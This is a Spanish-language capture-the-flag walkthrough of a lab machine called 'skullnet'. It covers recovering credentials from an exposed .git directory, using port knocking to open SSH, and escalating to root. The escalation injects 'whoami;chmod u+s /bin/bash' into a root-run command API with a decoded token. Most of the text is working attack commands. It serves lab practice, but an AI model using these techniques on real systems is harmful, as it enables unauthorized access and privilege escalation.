nmap: 80

![image](https://github.com/user-attachments/assets/bbbb702f-524b-4b3b-9c7e-66352f5a510b)

---
agregamos "skullnet.es" en nano /etc/host y entramos a la pagina

![image](https://github.com/user-attachments/assets/01fa9c26-8511-47e1-8c79-b8ea4e2f6d74)

no hay nada, hacemos un nmap mas profundo en el puerto 80
da un git. quedaría así la búsqueda: http://skullnet.es/.git/

![image](https://github.com/user-attachments/assets/9df19053-5d80-4100-96f7-3ba56452a335)

quedamos donde hay muchos archivos y nos pasamos los archivos a nuestra terminal

![image](https://github.com/user-attachments/assets/324ea04e-2e75-4fa4-a049-594c42842120)

lo pasamos con: 
> wget -r http://skullnet.es/.git/

hacemos un "git log" para ver los archivos modificados y da dos:
> fix y First commit

hacemos un: 
> git checkout -- . 

hacemos otra vez el "git log" y nos copiamos esto: 
> 648d951e0f8b7cc60b11c82d9328fe9cb1a4a53d

![image](https://github.com/user-attachments/assets/89472b3c-802c-4b15-867c-84493aa96f4f)


colocamos:

     git reset 648d951e0f8b7cc60b11c82d9328fe9cb1a4a53d

y nos da: 

>Unstaged changes after reset:
>D authentication.txt
>D network.pcap

colocamos "git diff" y vemos los cambios que se han realizado

volvemos hacer un "git checkout -- ." y tenemos los archivos

entramos al authentication.txt y nos da:
>cat authentication.txt 
>Hello skulloperator, as you know, we are implementing a new authentication mechanism to avoid brute-forcing...
>This credential and the attached network file will be enough. I know you will get it ;)
>+%7nj^g!DQxp]a>c4v&0

el final del resultado de esos paso: 

![image](https://github.com/user-attachments/assets/116bd170-09b3-4adb-97df-ea62674730e1)


la ultima es una posible contraseña, pero igual tenemos el archivo de red adjuntado que es el "network.pcap" que es un wireshark
lo abrimos: wireshark network.pcap

abrirá wireshark con las reglas capturadas y las revisaremos

las primeras 5 peticiones son mas color gris y hace peticiones en los puertos:
> 1000, 12000, 5000, 22 y 38118
> 
![image](https://github.com/user-attachments/assets/61641d93-d894-4b88-bdd1-d82df150a6ad)


como el puerto 22 esta cerrado hacemos un: 

     knock -v 172.18.0.2 1000 12000 5000 -d 4

se abrirá el puerto 22 y tenemos el usuario como contraseña que menciono antes: 
> skulloperator / +%7nj^g!DQxp]a>c4v&0

y estamos dentro

![image](https://github.com/user-attachments/assets/751206d3-a53e-4c66-b70c-97520bfa2b35)

ahora escalamos

al hacer un sudo -l o find, no muestra nada

al hacer un "ps -faux" muestra que se ejecuta un "cron -P" donde se ejecuta un archivo : 
>bin/sh -c python3 /var/www/skullnet.es/skullnet_api.py
>
![image](https://github.com/user-attachments/assets/39bf88d3-a708-47ee-8b38-85e850f3d675)


ingresamos a la ruta, entramos con nano al skullnet_api, pero no tenemos permisos de escritura pero si de lectura

dentro muestra que se abre un puerto 8081 que dentro se pueden ejecutar comando como "ls" o "whoami" y para que funcione se tiene que mandar un token de autorización que nos permita ejecutar y dentro hay una "AUTH_KEY_BASE64 = "d2VfYXJlX2JvbmVzXzUxMzU0NjUxNjQ4NjQ4NA=="
"
![image](https://github.com/user-attachments/assets/9d73fadc-548b-465d-b1bc-6840052e41d2)


lo sacamos con:

    echo 'd2VfYXJlX2JvbmVzXzUxMzU0NjUxNjQ4NjQ4NA=' | base 64 -d 

>nos da: we_are_bones_513546516486484

![image](https://github.com/user-attachments/assets/b0052559-89ea-4203-82a5-c8878bf8f1bd)


en el código aparece que hay que iniciar con una palabra que comience por "basic"

ejecutamos el comando:

    curl 127.0.0.1:8081?exec?=whoami -H "authorization: Basic we_are_bones_513546516486484"

ahora en el terminal victima hacemos un: 
 
    curl 127.0.0.1:8081?exec=whoami -H "Authorization: Basic we_are_bones_513546516486484"

>que nos mostrara: root

![image](https://github.com/user-attachments/assets/17b3323e-ccb5-4f3f-8985-f7d18390168b)

seguimos probando aparte del whoami, mandamos un id para esta pagina: https://www.urlencoder.org/

quedaría: whoami%3Bid

y ahora quedaría así: 

    curl 127.0.0.1:8081?exec=whoami%3Bid -H "Authorization: Basic we_are_bones_513546516486484"

que nos da los grupos con el id

![image](https://github.com/user-attachments/assets/f40edb7f-efa0-458f-8859-6703161115c9)


ya que funciona le intentamos dar permisos así:
> whoami;chmod u+s /bin/bash

y quedaría así el código: 

    curl 127.0.0.1:8081?exec=whoami%3Bchmod%20u%2Bs%20%2Fbin%2Fbash -H "Authorization: Basic we_are_bones_513546516486484"

lo lanzamos aparece solo root, vemos si cambio los permisos 
> ls -ls /bin/bash

ahora aparece en rojo, lanzamos un bash -p

![image](https://github.com/user-attachments/assets/af2c70ad-b1b8-4a0f-9afc-6dd54e17924e)

y somos root! 

